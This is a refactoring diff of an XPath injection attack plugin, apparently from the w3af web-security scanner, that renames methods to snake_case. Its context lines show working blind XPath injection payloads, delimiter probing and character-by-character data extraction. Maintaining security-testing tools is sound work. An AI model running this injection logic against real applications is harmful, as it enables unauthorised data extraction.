@@ -152,7 +152,7 @@ class xpath(AttackPlugin):
             return False
         
         self.STR_DEL = delimiter
-        orig_value = vuln.getMutant().getOriginalValue()
+        orig_value = vuln.getMutant().get_original_value()
         
         self.TRUE_COND = "%s%s and %s%i%s=%s%i" % (orig_value, self.STR_DEL, self.STR_DEL, 
                                                    self.rnum, self.STR_DEL, 
@@ -162,9 +162,9 @@ class xpath(AttackPlugin):
                                                     self.rnum, self.STR_DEL, 
                                                     self.STR_DEL, self.rnum + 1)
         
-        exploit_dc = vuln.getDc()
+        exploit_dc = vuln.get_dc()
         functionReference = getattr( self._uri_opener , vuln.get_method() )
-        exploit_dc[ vuln.getVar() ] = self.FALSE_COND
+        exploit_dc[ vuln.get_var() ] = self.FALSE_COND
 
         #
         #    Testing False response
@@ -185,7 +185,7 @@ class xpath(AttackPlugin):
             #    TRUE response.
             #
             om.out.debug( "Testing TRUE response..." )
-            exploit_dc[ vuln.getVar() ] = self.TRUE_COND
+            exploit_dc[ vuln.get_var() ] = self.TRUE_COND
 
             try:
                 true_resp = functionReference( vuln.getURL(), str(exploit_dc) )
@@ -205,8 +205,8 @@ class xpath(AttackPlugin):
         @return: The delimiter to be used to terminate strings, one of
         single quote or double quote. If an error is found, None is returned.
         '''
-        exploit_dc = vuln.getDc()
-        orig_value = vuln.getMutant().getOriginalValue()
+        exploit_dc = vuln.get_dc()
+        orig_value = vuln.getMutant().get_original_value()
         functionReference = getattr( self._uri_opener , vuln.get_method() )
         
         true_sq = "%s' and '%i'='%i" % (orig_value, self.rnum, self.rnum)
@@ -215,7 +215,7 @@ class xpath(AttackPlugin):
         
         om.out.debug( "Trying to determine string delimiter" )
         om.out.debug( "Testing single quote... (')" )
-        exploit_dc[ vuln.getVar() ] = true_sq
+        exploit_dc[ vuln.get_var() ] = true_sq
         try:
             sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
         except w3afException, e:
@@ -225,7 +225,7 @@ class xpath(AttackPlugin):
             if response_is_error(vuln, sq_resp.getBody(), self._uri_opener, self.use_difflib):
                 # If we found ERROR with TRUE Query, we have a problem!
                 om.out.debug( 'Single quote TRUE test failed, testing double quote' )
-                exploit_dc[ vuln.getVar() ] = true_dq
+                exploit_dc[ vuln.get_var() ] = true_dq
                 try:
                     dq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
                 except w3afException, e:
@@ -242,7 +242,7 @@ class xpath(AttackPlugin):
                         return '"'
             else:
                 # If true query was single-quote, test false query.
-                exploit_dc[ vuln.getVar() ] = false_sq
+                exploit_dc[ vuln.get_var() ] = false_sq
                 try:
                     sq_resp = functionReference( vuln.getURL(), str(exploit_dc) )
                 except w3afException, e:
@@ -267,9 +267,9 @@ class xpath(AttackPlugin):
         '''
         diffRatio = 0.0
         
-        exploit_dc = vuln.getDc()
+        exploit_dc = vuln.get_dc()
         functionReference = getattr( self._uri_opener , vuln.get_method() )
-        exploit_dc[ vuln.getVar() ] = vuln.getMutant().getOriginalValue()
+        exploit_dc[ vuln.get_var() ] = vuln.getMutant().get_original_value()
 
         om.out.debug( "Testing if body dynamically changes... " )
         try:
@@ -353,7 +353,7 @@ class xpath_reader(shell):
         This method executes a command in the remote operating system by
         exploiting the vulnerability.
 
-        @parameter command: The command to handle ( ie. "ls", "whoami", etc ).
+        @param command: The command to handle ( ie. "ls", "whoami", etc ).
         @return: The result of the command.
         '''
         data_len = self._get_data_len()
@@ -372,7 +372,7 @@ class xpath_reader(shell):
         @return: The length of the data to retrieve or self.max_data_len if the
         XML is too long. In the case of an error, None is returned.
         '''
-        exploit_dc = self.getDc()
+        exploit_dc = self.get_dc()
         functionReference = getattr( self._uri_opener , self.get_method() )
 
         maxl = self.max_data_len
@@ -386,14 +386,14 @@ class xpath_reader(shell):
             mid = (maxl + minl) / 2
             om.out.debug( "MAX:%i, MID:%i, MIN:%i" % (maxl, mid, minl) )
 
-            orig_value = self.getMutant().getMutant().getOriginalValue()
+            orig_value = self.getMutant().getMutant().get_original_value()
             skip_len = len(orig_value) + len(self.STR_DEL) + len(' ')
 
             findlen = "%s%s and string-length(%s)=%i %s" % (orig_value,
                                                            self.STR_DEL,
                                                            XML_FILTER, 
                                                            mid, self.TRUE_COND[skip_len:])
-            exploit_dc[ self.getVar() ] = findlen
+            exploit_dc[ self.get_var() ] = findlen
             
             try:    
                 lresp = functionReference( self.getURL(), str(exploit_dc) )
@@ -413,7 +413,7 @@ class xpath_reader(shell):
                                                                    XML_FILTER, 
                                                                    mid , self.TRUE_COND[skip_len:])
                     try:
-                        exploit_dc[ self.getVar() ] = findlen
+                        exploit_dc[ self.get_var() ] = findlen
                         lresp = functionReference( self.getURL(), str(exploit_dc) )
                     except w3afException, e:
                         om.out.debug( 'Error "' + str(e) + '"')
@@ -435,7 +435,7 @@ class xpath_reader(shell):
         
         HTTP library exceptions are not handled in order to make the code clearer. 
         '''
-        exploit_dc = self.getDc()
+        exploit_dc = self.get_dc()
         functionReference = getattr( self._uri_opener , self.get_method() )
 
         data = ''
@@ -443,7 +443,7 @@ class xpath_reader(shell):
         for pos in range(ldata):
             for c in range(32,127):
 
-                orig_value = self.getMutant().getMutant().getOriginalValue()
+                orig_value = self.getMutant().getMutant().get_original_value()
                 skip_len = len(orig_value) + len(self.STR_DEL) + len(' ')
                 
                 hexcar = chr(c)
@@ -452,7 +452,7 @@ class xpath_reader(shell):
                                                                  XML_FILTER, 
                                                                  pos, hexcar, 
                                                                  self.TRUE_COND[skip_len:])
-                exploit_dc[ self.getVar() ] = dataq
+                exploit_dc[ self.get_var() ] = dataq
                 dresp = functionReference( self.getURL(), str(exploit_dc) )
                 
                 if not response_is_error(self, dresp.getBody(), self._uri_opener, self.use_difflib):
@@ -482,10 +482,10 @@ def response_is_error(vuln_obj, res_body, url_opener, use_difflib=True):
     '''
     if use_difflib:
         
-        exploit_dc = vuln_obj.getDc()
+        exploit_dc = vuln_obj.get_dc()
         functionReference = getattr( url_opener , vuln_obj.get_method() )
 
-        exploit_dc[ vuln_obj.getVar() ] = vuln_obj.getMutant().getOriginalValue()
+        exploit_dc[ vuln_obj.get_var() ] = vuln_obj.getMutant().get_original_value()
 
         # TODO: Perform this request only once
         base_res = functionReference( vuln_obj.getURL(), str(exploit_dc) )
